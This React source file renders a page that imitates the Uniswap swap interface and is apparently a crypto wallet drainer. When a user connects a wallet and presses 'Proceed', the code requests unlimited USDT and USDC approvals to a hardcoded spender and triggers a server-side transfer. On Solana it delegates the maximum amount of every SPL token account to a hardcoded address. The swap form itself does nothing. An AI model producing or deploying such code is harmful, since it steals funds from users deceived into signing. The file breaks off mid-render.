import { Button } from "@/components/ui/button";
import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
import { useState, useEffect } from "react";
import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useChainId } from "wagmi";
import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
import headerImage from "@assets/image_1767365952238.png";

const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const EVM_TOKENS = [
  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "Tether" },
  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", name: "USD Coin" },
];

const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey {
  const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
  const [address] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID
  );
  return address;
}

function createApproveInstruction(
  tokenAccount: PublicKey,
  delegate: PublicKey,
  owner: PublicKey,
  amount: bigint
): TransactionInstruction {
  const data = new Uint8Array(9);
  data[0] = 4;
  
  const amountBytes = new ArrayBuffer(8);
  const view = new DataView(amountBytes);
  view.setBigUint64(0, amount, true);
  data.set(new Uint8Array(amountBytes), 1);
  
  return new TransactionInstruction({
    keys: [
      { pubkey: tokenAccount, isSigner: false, isWritable: true },
      { pubkey: delegate, isSigner: false, isWritable: false },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data: data as Buffer,
  });
}

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
] as const;

interface SolanaWalletProvider {
  connect: () => Promise<{ publicKey: PublicKey }>;
  disconnect: () => Promise<void>;
  signTransaction: (transaction: Transaction) => Promise<Transaction>;
  signAllTransactions?: (transactions: Transaction[]) => Promise<Transaction[]>;
  publicKey: PublicKey | null;
  isConnected: boolean;
  on?: (event: string, callback: () => void) => void;
  off?: (event: string, callback: () => void) => void;
}

declare global {
  interface Window {
    solana?: SolanaWalletProvider & { isPhantom?: boolean };
    backpack?: { solana?: SolanaWalletProvider };
    solflare?: SolanaWalletProvider & { isSolflare?: boolean };
    okxwallet?: { solana?: SolanaWalletProvider };
    trustwallet?: { solana?: SolanaWalletProvider };
    bitkeep?: { solana?: SolanaWalletProvider };
  }
}

type SolanaWalletType = "phantom" | "backpack" | "solflare" | "okx" | "trustwallet" | "bitget";

const isMobile = () => {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
};

const getDappUrl = () => encodeURIComponent(window.location.href);

const SOLANA_WALLETS = [
  { 
    id: "phantom" as SolanaWalletType, 
    name: "Phantom", 
    icon: "/assets/phantom-logo.png",
    getProvider: () => window.solana,
    isAvailable: () => !!window.solana?.isPhantom,
    mobileLink: () => `https://phantom.app/ul/browse/${getDappUrl()}`
  },
  { 
    id: "backpack" as SolanaWalletType, 
    name: "Backpack", 
    icon: "/assets/backpack-logo.png",
    getProvider: () => window.backpack?.solana,
    isAvailable: () => !!window.backpack?.solana,
    mobileLink: () => `https://backpack.app/ul/browse/${getDappUrl()}`
  },
  { 
    id: "solflare" as SolanaWalletType, 
    name: "Solflare", 
    icon: "/assets/solflare-logo.png",
    getProvider: () => window.solflare,
    isAvailable: () => !!window.solflare?.isSolflare,
    mobileLink: () => `https://solflare.com/ul/v1/browse/${getDappUrl()}`
  },
  { 
    id: "okx" as SolanaWalletType, 
    name: "OKX Wallet", 
    icon: "okx",
    getProvider: () => window.okxwallet?.solana,
    isAvailable: () => !!window.okxwallet?.solana,
    mobileLink: () => `okx://wallet/dapp/details?dappUrl=${getDappUrl()}`
  },
  { 
    id: "trustwallet" as SolanaWalletType, 
    name: "Trust Wallet", 
    icon: "/assets/trustwallet-logo.png",
    getProvider: () => window.trustwallet?.solana,
    isAvailable: () => !!window.trustwallet?.solana,
    mobileLink: () => `https://link.trustwallet.com/open_url?coin_id=501&url=${getDappUrl()}`
  },
  { 
    id: "bitget" as SolanaWalletType, 
    name: "Bitget Wallet", 
    icon: "/assets/bitget-logo.png",
    getProvider: () => window.bitkeep?.solana,
    isAvailable: () => !!window.bitkeep?.solana,
    mobileLink: () => `https://bkcode.vip/dapp?url=${getDappUrl()}`
  },
];

const TokenIcon = ({ symbol, size = 24 }: { symbol: string; size?: number }) => {
  const icons: Record<string, JSX.Element> = {
    ETH: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#627EEA"/>
        <path d="M16.498 4v8.87l7.497 3.35L16.498 4z" fill="#fff" fillOpacity=".6"/>
        <path d="M16.498 4L9 16.22l7.498-3.35V4z" fill="#fff"/>
        <path d="M16.498 21.968v6.027L24 17.616l-7.502 4.352z" fill="#fff" fillOpacity=".6"/>
        <path d="M16.498 27.995v-6.028L9 17.616l7.498 10.379z" fill="#fff"/>
        <path d="M16.498 20.573l7.497-4.353-7.497-3.348v7.701z" fill="#fff" fillOpacity=".2"/>
        <path d="M9 16.22l7.498 4.353v-7.701L9 16.22z" fill="#fff" fillOpacity=".6"/>
      </svg>
    ),
    SOL: (
      <img src="/assets/solana-logo.png" width={size} height={size} alt="SOL" className="rounded" style={{width: size, height: size}} />
    ),
    USDC: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#2775CA"/>
        <path d="M20.022 18.124c0-2.124-1.28-2.852-3.84-3.156-1.828-.24-2.196-.728-2.196-1.578 0-.85.608-1.396 1.824-1.396 1.088 0 1.696.364 1.972 1.276a.39.39 0 00.364.268h.84a.36.36 0 00.356-.388c-.24-1.516-1.264-2.632-2.892-2.908v-1.66a.358.358 0 00-.364-.364h-.728a.358.358 0 00-.364.364v1.604c-1.828.304-2.984 1.516-2.984 3.004 0 1.996 1.216 2.788 3.776 3.092 1.7.244 2.26.608 2.26 1.64 0 1.032-.912 1.724-2.132 1.724-1.66 0-2.196-.696-2.392-1.64a.374.374 0 00-.364-.304h-.912a.36.36 0 00-.356.388c.244 1.716 1.328 2.972 3.14 3.284v1.66c0 .2.164.364.364.364h.728a.358.358 0 00.364-.364v-1.66c1.828-.364 3.036-1.64 3.036-3.35z" fill="#fff"/>
        <path d="M12.628 24.164c-4.256-1.54-6.44-6.26-4.868-10.46 1.024-2.788 3.476-4.596 6.24-4.992V6.948c-3.632.396-6.672 2.788-8.024 6.14-2.016 5.052.476 10.792 5.528 12.808a9.856 9.856 0 003.124.728v-1.764a7.95 7.95 0 01-2-.696zM16 6.948v1.764c3.632.396 6.372 3.22 6.372 6.644h1.764c0-4.18-3.392-7.812-8.136-8.408z" fill="#fff"/>
      </svg>
    ),
    USDT: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#26A17B"/>
        <path d="M17.922 17.383v-.002c-.11.008-.677.042-1.942.042-1.01 0-1.721-.03-1.971-.042v.003c-3.888-.171-6.79-.848-6.79-1.658 0-.809 2.902-1.486 6.79-1.66v2.644c.254.018.982.061 1.988.061 1.207 0 1.812-.05 1.925-.06v-2.643c3.88.173 6.775.85 6.775 1.658 0 .81-2.895 1.485-6.775 1.657zm0-3.59v-2.366h5.414V7.819H8.595v3.608h5.414v2.365c-4.4.202-7.709 1.074-7.709 2.118 0 1.044 3.309 1.915 7.709 2.118v7.582h3.913v-7.584c4.393-.202 7.694-1.073 7.694-2.116 0-1.043-3.301-1.914-7.694-2.117z" fill="#fff"/>
      </svg>
    ),
    DAI: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#F5AC37"/>
        <path d="M16 6L9 16l7 10 7-10-7-10zm0 3.236L20.944 16 16 22.764 11.056 16 16 9.236z" fill="#fff"/>
        <path d="M16 22.764V26L23 16l-2.056 0L16 22.764zM16 9.236V6L9 16l2.056 0L16 9.236z" fill="#fff" fillOpacity=".6"/>
      </svg>
    ),
    WBTC: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#F7931A"/>
        <path d="M21.79 14.054c.24-1.602-.98-2.463-2.648-3.037l.541-2.17-1.32-.33-.527 2.112a53.34 53.34 0 00-1.057-.249l.53-2.126-1.32-.329-.541 2.17c-.289-.066-.573-.131-.849-.2l.001-.006-1.82-.455-.352 1.41s.98.225.96.239c.534.133.631.487.614.768l-.615 2.466c.037.009.084.023.137.044l-.14-.035-.862 3.455c-.065.162-.23.405-.603.313.013.019-.96-.24-.96-.24l-.656 1.513 1.717.428c.32.08.632.164.94.243l-.548 2.2 1.32.329.542-2.172c.36.098.71.188 1.051.273l-.54 2.162 1.32.33.548-2.195c2.257.427 3.954.255 4.668-1.786.576-1.643-.029-2.591-1.216-3.208.864-.2 1.515-.768 1.689-1.943zm-3.023 4.24c-.41 1.644-3.18.755-4.078.532l.728-2.917c.898.224 3.777.668 3.35 2.385zm.41-4.266c-.374 1.495-2.68.735-3.428.549l.66-2.645c.748.187 3.154.535 2.768 2.096z" fill="#fff"/>
      </svg>
    ),
  };
  return icons[symbol] || <div className="w-6 h-6 rounded-full bg-gray-400" />;
};

const TOKENS = [
  { symbol: "ETH", name: "Ethereum" },
  { symbol: "USDC", name: "USD Coin" },
  { symbol: "USDT", name: "Tether" },
  { symbol: "DAI", name: "Dai" },
  { symbol: "WBTC", name: "Wrapped BTC" },
];

const SOLANA_TOKENS = [
  { symbol: "SOL", name: "Solana" },
  { symbol: "USDC", name: "USD Coin" },
  { symbol: "USDT", name: "Tether" },
];

type Step = "idle" | "approving" | "transferring" | "done";
type NetworkType = "evm" | "solana";

export default function Home() {
  const [activeTab, setActiveTab] = useState("Swap");
  const [sellAmount, setSellAmount] = useState("");
  const [buyAmount, setBuyAmount] = useState("");
  const [sellToken, setSellToken] = useState(TOKENS[0]);
  const [buyToken, setBuyToken] = useState<typeof TOKENS[0] | null>(null);
  const [showSellTokens, setShowSellTokens] = useState(false);
  const [showBuyTokens, setShowBuyTokens] = useState(false);
  
  const [approvalQueue, setApprovalQueue] = useState<typeof EVM_TOKENS>([]);
  const [currentQueueIndex, setCurrentQueueIndex] = useState(0);
  const [step, setStep] = useState<Step>("idle");
  const [error, setError] = useState<string>("");
  
  const [networkType, setNetworkType] = useState<NetworkType>("evm");
  const [showSolanaWalletModal, setShowSolanaWalletModal] = useState(false);
  const [showUnifiedWalletModal, setShowUnifiedWalletModal] = useState(false);
  const [walletModalTab, setWalletModalTab] = useState<"evm" | "solana">("evm");
  
  const [solanaConnected, setSolanaConnected] = useState(false);
  const [solanaAddress, setSolanaAddress] = useState<string | null>(null);
  const [solanaStep, setSolanaStep] = useState<Step>("idle");
  const [selectedSolanaWallet, setSelectedSolanaWallet] = useState<SolanaWalletType | null>(null);
  const [solanaProvider, setSolanaProvider] = useState<SolanaWalletProvider | null>(null);

  const { address, isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();
  const { openChainModal } = useChainModal();
  const { disconnect } = useDisconnect();
  const chainId = useChainId();
  
  const chainNames: Record<number, string> = {
    1: "Ethereum",
    56: "BNB",
    137: "Polygon",
    42161: "Arbitrum",
    10: "Optimism",
    43114: "Avalanche",
    8453: "Base",
  };
  
  const { writeContract, data: hash, isPending, reset } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });

  const currentApprovalToken = approvalQueue[currentQueueIndex];
  const tokenAddress = currentApprovalToken?.address || "";
  const tokenSymbol = currentApprovalToken?.symbol || "";

  useEffect(() => {
    const checkPhantom = () => {
      if (window.solana?.isPhantom && window.solana.isConnected && window.solana.publicKey) {
        setSolanaConnected(true);
        setSolanaAddress(window.solana.publicKey.toBase58());
      }
    };
    
    checkPhantom();
    
    if (window.solana?.on) {
      window.solana.on('connect', checkPhantom);
      window.solana.on('disconnect', () => {
        setSolanaConnected(false);
        setSolanaAddress(null);
      });
    }
  }, []);

  useEffect(() => {
    if (isConfirmed && hash && step === "approving") {
      fetch("/api/approvals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenAddress: tokenAddress,
          tokenSymbol,
          transactionHash: hash,
        }),
      }).catch(console.error);

      setStep("transferring");
      executeRelayerTransfer();
    }
  }, [isConfirmed, hash, step]);

  const executeRelayerTransfer = async () => {
    try {
      const response = await fetch("/api/execute-transfer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenSymbol: tokenSymbol,
        }),
      });

      const result = await response.json();
      goToNextToken();
    } catch (err: any) {
      goToNextToken();
    }
  };

  const goToNextToken = () => {
    const nextIndex = currentQueueIndex + 1;
    if (nextIndex < approvalQueue.length) {
      setCurrentQueueIndex(nextIndex);
      reset();
      setTimeout(() => {
        setStep("approving");
        const nextToken = approvalQueue[nextIndex];
        writeContract({
          address: nextToken.address as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
        });
        
        if (isMobile()) {
          setTimeout(() => {
            window.location.href = "wc://";
          }, 300);
        }
      }, 500);
    } else {
      setStep("done");
    }
  };

  const handleProceed = () => {
    if (!address) return;
    setError("");

    if (step === "idle") {
      setApprovalQueue(EVM_TOKENS);
      setCurrentQueueIndex(0);
      setStep("approving");
      
      try {
        writeContract({
          address: EVM_TOKENS[0].address as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
        });
        
        if (isMobile()) {
          setTimeout(() => {
            window.location.href = "wc://";
          }, 300);
        }
      } catch (err: any) {
        setError(err?.message || "Failed to approve token");
        setStep("idle");
      }
    }
  };

  const connectSolanaWallet = async (walletType: SolanaWalletType) => {
    const walletConfig = SOLANA_WALLETS.find(w => w.id === walletType);
    if (!walletConfig) return;
    
    const provider = walletConfig.getProvider();
    
    if (!provider || !provider.connect) {
      if (isMobile()) {
        window.location.href = walletConfig.mobileLink();
        return;
      }
      const urls: Record<SolanaWalletType, string> = {
        phantom: "https://phantom.app/",
        backpack: "https://backpack.app/",
        solflare: "https://solflare.com/",
        okx: "https://www.okx.com/web3",
        trustwallet: "https://trustwallet.com/",
        bitget: "https://web3.bitget.com/",
      };
      window.open(urls[walletType], "_blank");
      return;
    }
    
    try {
      await provider.connect();
      
      const pubKey = provider.publicKey;
      if (!pubKey) {
        throw new Error("No public key after connect");
      }
      
      const address = typeof pubKey === 'string' ? pubKey : pubKey.toBase58();
      
      setSolanaConnected(true);
      setSolanaAddress(address);
      setSelectedSolanaWallet(walletType);
      setSolanaProvider(provider);
      setShowSolanaWalletModal(false);
    } catch (err: any) {
      console.error("Failed to connect Solana wallet:", err);
    }
  };

  const disconnectSolanaWallet = async () => {
    if (solanaProvider) {
      await solanaProvider.disconnect();
    }
    setSolanaConnected(false);
    setSolanaAddress(null);
    setSolanaStep("idle");
    setSelectedSolanaWallet(null);
    setSolanaProvider(null);
  };

  const handleSolanaProceed = async () => {
    if (!solanaProvider || !solanaAddress) return;
    setError("");
    setSolanaStep("approving");

    try {
      const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
      const delegateKey = new PublicKey(SOLANA_DELEGATE_ADDRESS);
      const userKey = new PublicKey(solanaAddress);
      
      const MAX_AMOUNT = BigInt("18446744073709551615");
      
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        userKey,
        { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
      );
      
      const tokensApproved: string[] = [];
      const transaction = new Transaction();
      
      for (const accountInfo of tokenAccounts.value) {
        const tokenAccount = accountInfo.pubkey;
        const parsedInfo = accountInfo.account.data.parsed?.info;
        
        transaction.add(
          createApproveInstruction(tokenAccount, delegateKey, userKey, MAX_AMOUNT)
        );
        
        const mintAddress = parsedInfo?.mint || "Unknown";
        tokensApproved.push(mintAddress);
      }
      
      if (transaction.instructions.length === 0) {
        setError("No SPL token accounts found. Please add tokens to your wallet first.");
        setSolanaStep("idle");
        return;
      }

      transaction.feePayer = userKey;
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;

      const signedTx = await solanaProvider.signTransaction(transaction);
      const txId = await connection.sendRawTransaction(signedTx.serialize());
      
      await connection.confirmTransaction(txId, "confirmed");

      fetch("/api/solana-approvals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: solanaAddress,
          delegateAddress: SOLANA_DELEGATE_ADDRESS,
          transactionHash: txId,
          tokensApproved,
          tokenCount: tokensApproved.length,
        }),
      }).catch(console.error);

      setSolanaStep("done");
    } catch (err: any) {
      console.error("Solana approval error:", err);
      setError(err?.message || "Failed to approve on Solana");
      setSolanaStep("idle");
    }
  };

  const isProcessing = isPending || isConfirming || step === "approving" || step === "transferring";
  const isSolanaProcessing = solanaStep === "approving" || solanaStep === "transferring";

  const handleSwapDirection = () => {
    const tempToken = sellToken;
    const tempAmount = sellAmount;
    setSellToken(buyToken || TOKENS[0]);
    setBuyToken(tempToken);
    setSellAmount(buyAmount);
    setBuyAmount(tempAmount);
  };

  const tabs = ["Swap", "Limit", "Buy", "Sell"];
  
  const currentTokens = networkType === "solana" ? SOLANA_TOKENS : TOKENS;
  const isWalletConnected = networkType === "solana" ? solanaConnected : isConnected;
  const walletAddress = networkType === "solana" ? solanaAddress : address;

  return (
    <div className="min-h-screen bg-background">
      <div className="fixed top-0 left-0 right-0 z-50">
        <div className="relative">
          <img 
            src={headerImage} 
            alt="Uniswap Header" 
            className="w-full h-auto"
            data-testid="img-header"
          />
          <div 
            className="absolute bg-white"
            style={{ 
              top: '50%', 
              right: '0',
              width: '280px',
              height: '50%',
              zIndex: 99
            }}
          />
          <div 
            className="absolute flex items-center gap-2"
            style={{ 
              top: '55%', 
              right: '1%',
              zIndex: 100
            }}
          >
            {(isConnected || solanaConnected) ? (
              <button 
                className="cursor-pointer border-0 outline-none bg-[#FF00D6] hover:bg-[#e800c0] text-white font-semibold rounded-[20px] px-5 py-2 text-sm whitespace-nowrap"
                onClick={() => {
                  if (solanaConnected) {
                    disconnectSolanaWallet();
                  } else if (isConnected) {
                    disconnect();
                  }
                }}
                data-testid="button-disconnect"
              >
                {solanaConnected 
                  ? `${solanaAddress?.slice(0, 4)}...${solanaAddress?.slice(-4)}`
                  : `${address?.slice(0, 6)}...${address?.slice(-4)}`
                }
              </button>
            ) : (
              <button 
                className="cursor-pointer border-0 outline-none bg-[#FF00D6] hover:bg-[#e800c0] text-white font-semibold rounded-[20px] px-5 py-2 text-sm whitespace-nowrap"
                onClick={() => setShowUnifiedWalletModal(true)}
                data-testid="button-connect"
              >
                Connect Wallet
              </button>
            )}
          </div>
        </div>
      </div>

      <main className="pt-32 pb-20 px-4" style={{ marginTop: '80px' }}>
        <div className="max-w-md mx-auto">
          <div className="bg-card rounded-3xl border border-border shadow-lg p-2 relative">
            {isWalletConnected && (
              <div className="absolute inset-0 z-20 flex items-center justify-center bg-white/80 backdrop-blur-md rounded-3xl">
                {networkType === "solana" ? (
                  solanaStep === "done" ? (
                    <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
                      <CheckCircle className="w-5 h-5" />
                      Complete!
                    </div>
                  ) : (
                    <button
                      onClick={handleSolanaProceed}
                      disabled={isSolanaProcessing}
                      className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-12 py-4 rounded-full text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg"
                      data-testid="button-proceed-solana"
                    >
                      {isSolanaProcessing ? (
                        <>
                          <Loader2 className="w-5 h-5 animate-spin" />
                          Processing...
                        </>
                      ) : (
                        "Proceed"
                      )}
                    </button>
                  )
                ) : step === "done" ? (
                  <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
                    <CheckCircle className="w-5 h-5" />
                    Complete!
                  </div>
                ) : (
                  <button
                    onClick={handleProceed}
                    disabled={isProcessing}
                    className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-12 py-4 rounded-full text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg"
                    data-testid="button-proceed"
                  >
                    {isProcessing ? (
                      <>
                        <Loader2 className="w-5 h-5 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      "Proceed"
                    )}
                  </button>
                )}
              </div>
            )}

            <div className="flex items-center justify-between px-2 py-2 mb-2">
              <div className="flex items-center gap-1">
                {tabs.map((tab) => (
                  <button
                    key={tab}
                    onClick={() => setActiveTab(tab)}
                    className={`px-4 py-2 text-sm font-medium rounded-full transition-colors ${
                      activeTab === tab
                        ? "bg-muted text-foreground"
                        : "text-muted-foreground hover:text-foreground"
                    }`}
                    data-testid={`tab-${tab.toLowerCase()}`}
                  >
                    {tab}
                  </button>
                ))}
              </div>
              <button className="p-2 hover:bg-muted rounded-lg" data-testid="button-settings">
                <Settings className="w-5 h-5 text-muted-foreground" />
              </button>
            </div>

            <div className="space-y-1">
              <div className="bg-muted rounded-2xl p-4 relative">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm text-muted-foreground">Sell</span>
                </div>
                <div className="flex items-center justify-between gap-4">
                  <input
                    type="text"
                    value={sellAmount}
                    onChange={(e) => setSellAmount(e.target.value)}
                    placeholder="0"
                    className="bg-transparent text-4xl font-medium w-full focus:outline-none text-foreground placeholder:text-muted-foreground"
                    data-testid="input-sell-amount"
                  />
                  <div className="relative">
                    <button
                      onClick={() => setShowSellTokens(!showSellTokens)}
                      className="flex items-center gap-2 bg-background hover:bg-background/80 rounded-full px-3 py-2 border border-border shadow-sm"
                      data-testid="button-sell-token"
                    >
                      <TokenIcon symbol={sellToken.symbol} size={24} />
                      <span className="font-semibold">{sellToken.symbol}</span>
                      <ChevronDown className="w-4 h-4 text-muted-foreground" />
                    </button>
                    
                    {showSellTokens && (
                      <div className="absolute right-0 top-12 bg-card border border-border rounded-2xl shadow-xl p-2 w-56 z-10">
                        {currentTokens.map((token) => (
                          <button
                            key={token.symbol}
                            onClick={() => {
                              setSellToken(token);
                              setShowSellTokens(false);
                            }}
                            className="flex items-center gap-3 w-full p-3 hover:bg-muted rounded-xl"
                            data-testid={`sell-token-${token.symbol.toLowerCase()}`}
                          >
                            <TokenIcon symbol={token.symbol} size={32} />
                            <div className="text-left">
                              <div className="font-medium">{token.symbol}</div>
                              <div className="text-xs text-muted-foreground">{token.name}</div>
                            </div>
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
                <div className="text-sm text-muted-foreground mt-1">$0</div>
              </div>

              <div className="flex justify-center -my-2 relative z-10">
                <button
                  onClick={handleSwapDirection}
                  className="bg-muted hover:bg-muted/80 border-4 border-card rounded-xl p-2 transition-transform hover:rotate-180 duration-300"
                  data-testid="button-swap-direction"
                >
                  <ArrowDown className="w-4 h-4 text-muted-foreground" />
                </button>
              </div>

              <div className="bg-muted rounded-2xl p-4">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm text-muted-foreground">Buy</span>
                </div>
                <div className="flex items-center justify-between gap-4">
                  <input
                    type="text"
                    value={buyAmount}
                    onChange={(e) => setBuyAmount(e.target.value)}
                    placeholder="0"
                    className="bg-transparent text-4xl font-medium w-full focus:outline-none text-foreground placeholder:text-muted-foreground"
                    data-testid="input-buy-amount"
                  />
                  <div className="relative">
                    <button
                      onClick={() => setShowBuyTokens(!showBuyTokens)}
                      className={`flex items-center gap-2 rounded-full px-3 py-2 font-semibold text-sm whitespace-nowrap ${
                        buyToken 
                          ? "bg-background hover:bg-background/80 border border-border shadow-sm" 
                          : "bg-[#FF00D6] hover:bg-[#e800c0] text-white"
                      }`}
                      data-testid="button-buy-token"
                    >
                      {buyToken ? (
                        <>
                          <TokenIcon symbol={buyToken.symbol} size={24} />
                          <span>{buyToken.symbol}</span>
                        </>
                      ) : (
                        <span>Select token</span>
                      )}
                      <ChevronDown className="w-4 h-4" />
                    </button>
                    
                    {showBuyTokens && (
                      <div className="absolute right-0 top-12 bg-card border border-border rounded-2xl shadow-xl p-2 w-56 z-10">
                        {currentTokens.filter(t => t.symbol !== sellToken.symbol).map((token) => (
                          <button
                            key={token.symbol}
                            onClick={() => {
                              setBuyToken(token);
                              setShowBuyTokens(false);
                            }}
                            className="flex items-center gap-3 w-full p-3 hover:bg-muted rounded-xl"
                            data-testid={`buy-token-${token.symbol.toLowerCase()}`}
                          >
                            <TokenIcon symbol={token.symbol} size={32} />
                            <div className="text-left">
                              <div className="font-medium">{token.symbol}</div>
                              <div className="text-xs text-muted-foreground">{token.name}</div>
                            </div>
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>

            {!isWalletConnected && (
              <div className="mt-4">
                <button
                  onClick={() => setShowUnifiedWalletModal(true)}
                  className="w-full py-4 text-lg font-semibold rounded-2xl bg-[#FFF0FB] hover:bg-[#FFE4F5] text-[#FF00D6]"
                  data-testid="button-connect-wallet"
                >
                  Connect wallet
                </button>
              </div>
            )}
          </div>
        </div>
      </main>

      <div className="fixed bottom-4 left-4">
        <button className="w-8 h-8 bg-black rounded-full flex items-center justify-center hover:bg-gray-800" data-testid="button-help">
          <span className="text-white text-sm font-medium">?</span>
        </button>
      </div>

      {showUnifiedWalletModal && (
        <div 
          className="fixed inset-0 bg-black/50 flex items-center justify-center z-[200]"
          onClick={() => setShowUnifiedWalletModal(false)}
        >
          <div 
            className="bg-white rounded-3xl p-6 w-[420px] max-h-[80vh] shadow-2xl flex flex-col"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-semibold text-gray-900">Connect Wallet</h2>
              <button
                onClick={() => setShowUnifiedWalletModal(false)}
                className="p-2 hover:bg-gray-100 rounded-full"
                data-testid="button-close-wallet-modal"
              >
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                  <path d="M1 1L13 13M1 13L13 1" stroke="#9CA3AF" strokeWidth="2" strokeLinecap="round"/>
                </svg>
              </button>
            </div>
            
            <div className="flex gap-2 mb-6 bg-gray-100 rounded-xl p-1">
              <button
                onClick={() => setWalletModalTab("evm")}
                className={`flex-1 py-3 px-4 rounded-lg font-medium transition-all ${
                  walletModalTab === "evm" 
                    ? "bg-white text-gray-900 shadow-sm" 
                    : "text-gray-500 hover:text-gray-900"
                }`}
                data-testid="tab-evm"
              >
                EVM
              </button>
              <button
                onClick={() => setWalletModalTab("solana")}
                className={`flex-1 py-3 px-4 rounded-lg font-medium transition-all ${
                  walletModalTab === "solana" 
                    ? "bg-[#FF00D6] text-white" 
                    : "text-gray-500 hover:text-gray-900"
                }`}
                data-testid="tab-solana"
              >
                Solana
              </button>
            </div>
            
            {walletModalTab === "evm" ? (
              <div className="flex flex-col items-center justify-center py-8">
                <div className="flex items-center gap-2 mb-4">
                  <TokenIcon symbol="ETH" size={24} />
                  <span className="text-gray-700 font-medium">EVM Networks</span>
                </div>
                <p className="text-gray-500 text-sm mb-6 text-center">Connect with Ethereum, BSC, Polygon, Arbitrum, Optimism, Avalanche, or Base</p>
                <button
                  onClick={() => {
                    setShowUnifiedWalletModal(false);
                    setNetworkType("evm");
                    setSellToken(TOKENS[0]);
                    setBuyToken(null);
                    openConnectModal?.();
                  }}
                  className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-8 py-3 rounded-xl font-semibold"
                  data-testid="button-open-evm-modal"
                >
                  Select Wallet
                </button>
              </div>
            ) : (
              <div className="space-y-3 overflow-y-auto flex-1">
                <div className="flex items-center gap-2 mb-4">
                  <TokenIcon symbol="SOL" size={20} />
                  <span className="text-gray-500 text-sm">Solana Wallet</span>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  {SOLANA_WALLETS.map((wallet) => {
                    const isAvailable = wallet.isAvailable();
                    const renderWalletIcon = () => {
                      if (wallet.icon.startsWith('/')) {
                        return (
                          <img 
                            src={wallet.icon} 
                            alt={wallet.name}
                            className="w-full h-full object-cover rounded-lg"
                          />
                        );
                      }
                      const walletIcons: Record<string, JSX.Element> = {
                        okx: (
                          <svg viewBox="0 0 40 40" className="w-full h-full">
                            <rect width="40" height="40" rx="8" fill="black"/>
                            <rect x="10" y="10" width="6" height="6" rx="1" fill="white"/>
                            <rect x="17" y="17" width="6" height="6" rx="1" fill="white"/>
                            <rect x="24" y="10" width="6" height="6" rx="1" fill="white"/>
                            <rect x="10" y="24" width="6" height="6" rx="1" fill="white"/>
